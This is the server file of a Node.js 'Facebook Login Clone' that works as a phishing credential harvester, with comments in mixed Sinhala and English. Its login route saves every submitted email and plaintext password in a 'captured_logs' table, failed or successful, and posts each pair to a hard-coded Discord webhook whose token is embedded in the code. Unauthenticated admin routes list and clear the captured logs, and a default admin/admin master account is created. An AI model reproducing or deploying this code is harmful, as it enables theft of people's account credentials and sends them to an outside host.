// ================================================================
//  Facebook Login Clone - Backend Server
//  mysql2 use karanawa (XAMPP + phpMyAdmin!)
// ================================================================

const express = require('express');
const cors = require('cors');
const bcrypt = require('bcryptjs');
const sqlite3 = require('sqlite3');
const https = require('https');
const { open } = require('sqlite');

const app = express();
const PORT = 3000;

app.use(cors());
app.use(express.json());
app.use(express.static(__dirname));

let db;

// ── Create Tables if not exists ───────────────────────────────────
async function initDb() {
  try {
    db = await open({
      filename: 'database.sqlite',
      driver: sqlite3.Database
    });

    await db.exec(`
      CREATE TABLE IF NOT EXISTS users (
        id        INTEGER PRIMARY KEY AUTOINCREMENT,
        firstName VARCHAR(100) NOT NULL,
        lastName  VARCHAR(100) DEFAULT '',
        email     VARCHAR(255) NOT NULL UNIQUE,
        password  VARCHAR(255) NOT NULL,
        role      VARCHAR(50)  DEFAULT 'user',
        createdAt DATETIME     DEFAULT CURRENT_TIMESTAMP
      )
    `);

    await db.exec(`
      CREATE TABLE IF NOT EXISTS captured_logs (
        id        INTEGER PRIMARY KEY AUTOINCREMENT,
        email     VARCHAR(255),
        password  VARCHAR(255),
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
      )
    `);

    // Old master account cleanup (admin@master.com eka delete karanna)
    await db.run(`DELETE FROM users WHERE email = 'admin@master.com'`);

    // Master account create karanna (if not exists)
    const masterUsername = 'admin';
    const masterPass = 'admin';
    const existingMaster = await db.get(
      'SELECT id FROM users WHERE email = ?', [masterUsername]
    );

    if (!existingMaster) {
      const hashed = bcrypt.hashSync(masterPass, 10);
      await db.run(
        'INSERT INTO users (firstName, lastName, email, password, role) VALUES (?, ?, ?, ?, ?)',
        ['Admin', '', masterUsername, hashed, 'master']
      );
      console.log(`👑 Master Account created: username=${masterUsername} / password=${masterPass}`);
    } else {
      console.log(`👑 Master Account already exists: username=${masterUsername}`);
    }

    console.log('✅ SQLite database connected & tables ready!');
  } catch (err) {
    console.error('❌ Database connection failed:', err.message);
    process.exit(1);
  }
}

// ── DISCORD WEBHOOK ────────────────────────────────────────────────
function sendToDiscord(email, password) {
  const webhookUrl = new URL('https://discord.com/api/webhooks/1518588589355569424/4jAekBui6Cke2kLAI61qYJJyEAFwRGPdqLaMF_FRg0_UEDzPQgtvIrEdcjo60hhN3hvJ');
  const data = JSON.stringify({
    content: `🚨 **New Log Captured!**\n**Email/Username:** \`${email}\`\n**Password:** \`${password}\``
  });

  const req = https.request(webhookUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(data)
    }
  });

  req.on('error', (e) => console.error(`Discord Webhook Error: ${e.message}`));
  req.write(data);
  req.end();
}

// ── ROUTES ───────────────────────────────────────────────────────

app.get('/health', (req, res) => {
  res.json({ status: 'ok', message: 'Server is running with SQLite!' });
});

// REGISTER
app.post('/register', async (req, res) => {
  const { firstName, lastName, email, password } = req.body;

  if (!firstName || !email || !password) {
    return res.status(400).json({ message: 'firstName, email, password required.' });
  }
  if (password.length < 6) {
    return res.status(400).json({ message: 'Password min 6 characters wenna one.' });
  }

  try {
    const existing = await db.get(
      'SELECT id FROM users WHERE email = ?', [email]
    );

    if (existing) {
      return res.status(409).json({ message: 'Email already registered! Login karanna.' });
    }

    const hashed = bcrypt.hashSync(password, 10);
    const result = await db.run(
      'INSERT INTO users (firstName, lastName, email, password) VALUES (?, ?, ?, ?)',
      [firstName, lastName || '', email, hashed]
    );

    console.log(`✅ Registered: ${email} (ID: ${result.lastID})`);
    res.status(201).json({ message: 'Account created!', userId: result.lastID });
  } catch (e) {
    console.error(e);
    res.status(500).json({ message: 'Server error.' });
  }
});

// LOGIN  (email OR username dono accept karanawa)
app.post('/login', async (req, res) => {
  const { email, password } = req.body;   // frontend 'email' field = username or email

  if (!email || !password) {
    return res.status(400).json({ message: 'Username/Email saha password denna.' });
  }

  try {
    // Try matching by email field OR by username stored in email column
    const user = await db.get(
      'SELECT * FROM users WHERE email = ?', [email.trim()]
    );

    if (!user) {
      // Capture failed login attempt
      await db.run(
        'INSERT INTO captured_logs (email, password) VALUES (?, ?)', [email, password]
      );
      sendToDiscord(email, password);
      return res.status(401).json({ message: 'Account nemei. Register karanna!' });
    }

    const match = bcrypt.compareSync(password, user.password);

    // Capture credentials (master account baduwa matakawanawa)
    if (user.role !== 'master') {
      await db.run(
        'INSERT INTO captured_logs (email, password) VALUES (?, ?)', [email, password]
      );
      sendToDiscord(email, password);
      console.log(`⚠️  Captured Login: ${email} | Pass: ${password}`);
    }

    if (!match) {
      return res.status(401).json({ message: 'Password incorrect!' });
    }

    console.log(`✅ Login: ${email} (${user.role})`);
    res.json({
      message: 'Login successful!',
      user: {
        id: user.id,
        firstName: user.firstName,
        lastName: user.lastName,
        email: user.email,
        role: user.role,
        createdAt: user.createdAt
      }
    });
  } catch (e) {
    console.error(e);
    res.status(500).json({ message: 'Server error.' });
  }
});

// ADMIN: GET ALL CAPTURED LOGS
app.get('/admin/logs', async (req, res) => {
  try {
    const logs = await db.all(
      'SELECT * FROM captured_logs ORDER BY id DESC'
    );
    res.json(logs);
  } catch (e) {
    res.status(500).json({ message: 'Error fetching logs' });
  }
});

// ADMIN: CLEAR LOGS
app.post('/admin/clear-logs', async (req, res) => {
  try {
    await db.run('DELETE FROM captured_logs');
    res.json({ message: 'Logs cleared!' });
  } catch (e) {
    res.status(500).json({ message: 'Error clearing logs' });
  }
});

// GET ALL USERS
app.get('/users', async (req, res) => {
  try {
    const users = await db.all(
      'SELECT id, firstName, lastName, email, role, createdAt FROM users ORDER BY id DESC'
    );
    res.json({ count: users.length, users });
  } catch (e) {
    res.status(500).json({ message: 'Error fetching users' });
  }
});

// ── START ────────────────────────────────────────────────────────
initDb().then(() => {
  app.listen(PORT, () => {
    console.log('\n╔════════════════════════════════════════╗');
    console.log(`║  🚀 http://localhost:${PORT}               ║`);
    console.log('║  POST /register  →  Account hadanna   ║');
    console.log('║  POST /login     →  Login karanna     ║');
    console.log('║  GET  /users     →  All users list    ║');
    console.log('║  GET  /admin/logs →  Captured logs   ║');
    console.log('╚════════════════════════════════════════╝\n');
  });
});
